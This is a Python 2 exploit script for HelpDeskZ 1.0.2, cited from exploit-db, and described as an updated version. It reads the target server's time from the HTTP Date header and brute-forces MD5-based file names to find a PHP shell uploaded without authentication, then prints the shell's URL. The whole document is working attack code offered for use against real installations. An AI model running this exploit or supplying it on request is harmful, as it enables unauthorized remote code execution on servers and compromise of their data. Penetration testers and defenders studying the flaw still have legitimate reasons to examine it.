#!/usr/bin/python
'''
HelpDeskZ 1.0.2 - Arbitrary File Upload 

https://www.exploit-db.com/exploits/40300

UPDATED EXPLOIT BY - Lokendra Singh Rawat 

Q.  what's new? 
A.  Problem with time formatting, it's need same time/time-zone as target machine 
    so intead of using time from attacer's machine it uses time from server response 

    NOTE:- URL may vary, so check for that

'''
import hashlib
import time
import sys
import requests
import datetime

print 'Helpdeskz v1.0.2 - Unauthenticated shell upload exploit'

if len(sys.argv) < 3:
    print "Usage {} [baseUrl] [nameOfUploadedFile]".format(sys.argv[0])
    sys.exit(1)

helpdeskzBaseUrl = sys.argv[1]
fileName = sys.argv[2]


r = requests.get(helpdeskzBaseUrl)

#Gets the current time of the server to prevent timezone errors - DoctorEww
#currentTime = int((datetime.datetime.strptime(r.headers['date'] %a %d %b %Y %H%M%S %Z) - datetime.datetime(1970,1,1)).total_seconds())
currentTime = int((datetime.datetime.strptime(r.headers['date'],"%a, %d %b %Y %H:%M:%S %Z") - datetime.datetime(1970,1,1)).total_seconds())

for x in range(0, 900):
    plaintext = fileName + str(currentTime - x)
    md5hash = hashlib.md5(plaintext).hexdigest()

    url = helpdeskzBaseUrl+md5hash+'.php'
    response = requests.head(url)
    if response.status_code == 200:
        print "found!"
        print url
        sys.exit(0)
    elif x%10 == 0:
        print x,"Attemps done."

print "Sorry, I did not find anything"
